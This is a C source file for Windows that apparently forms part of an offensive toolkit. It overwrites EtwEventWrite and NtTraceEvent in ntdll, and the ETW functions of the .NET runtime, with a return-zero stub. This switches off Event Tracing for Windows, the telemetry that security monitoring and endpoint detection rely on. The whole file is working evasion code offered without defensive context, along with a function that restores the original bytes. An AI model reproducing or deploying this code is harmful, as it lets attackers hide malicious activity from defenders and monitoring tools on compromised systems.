#ifdef _WIN32

#include "etw.h"
#include <windows.h>
#include <stdio.h>

// Original bytes backup for restore
static unsigned char etw_original_bytes[16] = {0};
static int etw_patched = 0;

int etw_bypass_event_write(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    // Find EtwEventWrite function
    FARPROC etw_func = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etw_func) return -1;

    // Backup original bytes
    memcpy(etw_original_bytes, (void*)etw_func, sizeof(etw_original_bytes));

    // Patch: xor eax, eax; ret
    // This makes EtwEventWrite return 0 immediately
    unsigned char patch[] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3         // ret
    };

    DWORD old_protect;
    if (!VirtualProtect((void*)etw_func, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    memcpy((void*)etw_func, patch, sizeof(patch));

    DWORD temp;
    VirtualProtect((void*)etw_func, sizeof(patch), old_protect, &temp);

    etw_patched = 1;
    return 0;
}

int etw_bypass_trace_event(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    // Also patch NtTraceEvent
    FARPROC trace_func = GetProcAddress(ntdll, "NtTraceEvent");
    if (!trace_func) return -1;

    unsigned char patch[] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3         // ret
    };

    DWORD old_protect;
    if (!VirtualProtect((void*)trace_func, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    memcpy((void*)trace_func, patch, sizeof(patch));

    DWORD temp;
    VirtualProtect((void*)trace_func, sizeof(patch), old_protect, &temp);

    return 0;
}

int etw_restore_event_write(void) {
    if (!etw_patched) return 0;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    FARPROC etw_func = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etw_func) return -1;

    DWORD old_protect;
    if (!VirtualProtect((void*)etw_func, sizeof(etw_original_bytes), PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    memcpy((void*)etw_func, etw_original_bytes, sizeof(etw_original_bytes));

    DWORD temp;
    VirtualProtect((void*)etw_func, sizeof(etw_original_bytes), old_protect, &temp);

    etw_patched = 0;
    return 0;
}

int etw_is_patched(void) {
    return etw_patched;
}

int etw_bypass_clr(void) {
    // Patch .NET CLR ETW
    HMODULE clr = GetModuleHandleA("clr.dll");
    if (!clr) {
        clr = GetModuleHandleA("coreclr.dll"); // .NET Core
    }
    
    if (!clr) return -1; // No .NET runtime loaded

    // Find CLR ETW functions
    const char* etw_funcs[] = {
        "EtwEventEnabled",
        "EtwEventProviderEnabled",
        "EtwEventWrite"
    };

    for (int i = 0; i < sizeof(etw_funcs) / sizeof(etw_funcs[0]); i++) {
        FARPROC func = GetProcAddress(clr, etw_funcs[i]);
        if (!func) continue;

        unsigned char patch[] = {0x33, 0xC0, 0xC3}; // xor eax, eax; ret

        DWORD old_protect;
        if (VirtualProtect((void*)func, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect)) {
            memcpy((void*)func, patch, sizeof(patch));
            DWORD temp;
            VirtualProtect((void*)func, sizeof(patch), old_protect, &temp);
        }
    }

    return 0;
}

#endif // _WIN32
